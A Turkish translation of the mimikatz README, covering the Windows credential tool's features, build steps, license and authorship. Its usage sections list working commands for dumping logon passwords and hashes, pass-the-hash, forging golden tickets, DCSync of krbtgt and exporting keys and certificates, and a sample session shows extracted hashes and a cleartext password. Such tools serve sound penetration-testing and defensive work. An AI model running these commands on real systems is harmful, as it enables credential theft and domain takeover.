# mimikatz (Türkçe)

> Bu depo, [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) (ParrotSec paketleme fork'u üzerinden) projesinin Türkçe README çevirisidir. Orijinal proje Benjamin DELPY (`gentilkiwi`) tarafından **CC BY 4.0** lisansı ile yayınlanmıştır - kullanım ve paylaşım serbesttir, tek şart Benjamin DELPY'ye açık atıf yapılmasıdır.
>
> **Önemli:** Bu depoda mimikatz'ın gerçek C kaynak kodu bulunmamaktadır - `Win32/` ve `x64/` klasörlerindeki önceden derlenmiş ikili dosyalar (`mimikatz.exe`, `mimidrv.sys`, `mimilib.dll`) değiştirilmeden orijinal halleriyle bırakılmıştır. Gerçek kaynak kod, orijinal [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) deposunda yer alır ve orada da aynı CC BY 4.0 lisansı geçerlidir.

**`mimikatz`**, `C` dilini öğrenmek ve Windows güvenliği üzerine bazı deneyler yapmak için Benjamin DELPY tarafından geliştirilmiş bir araçtır.

Artık bellekten açık metin parolaları, hash'leri, PIN kodlarını ve kerberos biletlerini çıkarmasıyla iyi bilinmektedir. **`mimikatz`** ayrıca pass-the-hash, pass-the-ticket yapabilir veya _Golden ticket_ üretebilir.

```
  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                    with  13 modules * * */


mimikatz # privilege::debug
Privilege '20' OK
 
mimikatz # sekurlsa::logonpasswords
 
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : Gentil Kiwi
Domain            : vm-w7-ult-x
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * Password : waza1234/
...
```

Ama hepsi bu kadar değil! `Crypto`, `Terminal Server`, `Events`, ... GitHub Wiki'de https://github.com/gentilkiwi/mimikatz/wiki veya http://blog.gentilkiwi.com adresinde (Fransızca, _evet_) çok daha fazla bilgi bulunmaktadır.

Kendiniz derlemek istemiyorsanız, ikili (binary) dosyalar https://github.com/gentilkiwi/mimikatz/releases adresinde mevcuttur.

## Hızlı Kullanım
```
log
privilege::debug
```

### sekurlsa
```
sekurlsa::logonpasswords
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

### kerberos
```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### crypto
```
crypto::capi
crypto::cng

crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE

crypto::keys /export
crypto::keys /machine /export
```

### vault & lsadump
```
vault::cred
vault::list

token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert

lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

## Derleme
`mimikatz`, bir Visual Studio Solution ve bir WinDDK sürücüsü (opsiyonel, yalnızca ana işlemler için gerekli değil) şeklindedir. Bu nedenle ön koşullar şunlardır:
* `mimikatz` ve `mimilib` için: Visual Studio 2010, 2012 veya 2013 for Desktop (**2013 Express for Desktop ücretsizdir ve x86 & x64 destekler** - http://www.microsoft.com/download/details.aspx?id=44914)
* _`mimikatz driver`, `mimilove` (ve `ddk2003` platformu) için: Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_

`mimikatz` kaynak kontrolü için `SVN` kullanır, ancak artık `GIT` ile de kullanılabilir!
Senkronize etmek için istediğiniz herhangi bir aracı kullanabilirsiniz, hatta Visual Studio 2013'e gömülü `GIT`'i bile =)

### Senkronize Edin!
* GIT adresi: https://github.com/gentilkiwi/mimikatz.git
* SVN adresi: https://github.com/gentilkiwi/mimikatz/trunk
* ZIP dosyası: https://github.com/gentilkiwi/mimikatz/archive/master.zip

### Çözümü (solution) Derleme
* Çözümü açtıktan sonra `Build` / `Build Solution` (mimariyi değiştirebilirsiniz)
* `mimikatz` artık derlendi ve kullanıma hazır! (`Win32` / `x64` hatta şanslıysanız `ARM64`)
  * `_build_.cmd` ve `mimidrv` hakkında `MSB3073` hatası alabilirsiniz; bunun nedeni sürücünün Windows Driver Kit **7.1** (WinDDK) olmadan derlenememesidir, ama `mimikatz` ve `mimilib` sorunsuz derlenir.

### ddk2003
Bu opsiyonel MSBuild platformuyla, WinDDK derleme araçlarını ve varsayılan `msvcrt` çalışma zamanını (runtime) kullanabilirsiniz (daha küçük ikili dosyalar, bağımlılık yok).

Bu opsiyonel platform için Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 ve Visual Studio **2010** zorunludur, sonrasında Visual Studio 2012 veya 2013 kullanmayı planlasanız bile.

Talimatları izleyin:
* http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme
* _http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_

## Lisans
CC BY 4.0 lisansı - https://creativecommons.org/licenses/by/4.0/

`mimikatz`'ın geliştirilmeye devam etmesi için kahveye ihtiyacı var:
* PayPal: https://www.paypal.me/delpy/

## Yazar
* Benjamin DELPY `gentilkiwi` - Twitter'da ( @gentilkiwi ) veya e-posta ile ( benjamin [at] gentilkiwi.com ) iletişime geçebilirsiniz
* `lsadump` modülündeki DCSync ve DCShadow fonksiyonları Vincent LE TOUX ile birlikte yazılmıştır - e-posta ile ( vincent.letoux [at] gmail.com ) veya web sitesinden ( http://www.mysmartlogon.com ) iletişime geçebilirsiniz

Bu **kişisel** bir geliştirmedir, lütfen felsefesine saygı gösterin ve kötü amaçlarla kullanmayın!

## Kaynak
Orijinal proje: https://github.com/gentilkiwi/mimikatz
Bu Türkçe uyarlamanın temel aldığı paketleme fork'u: https://github.com/ParrotSec/mimikatz
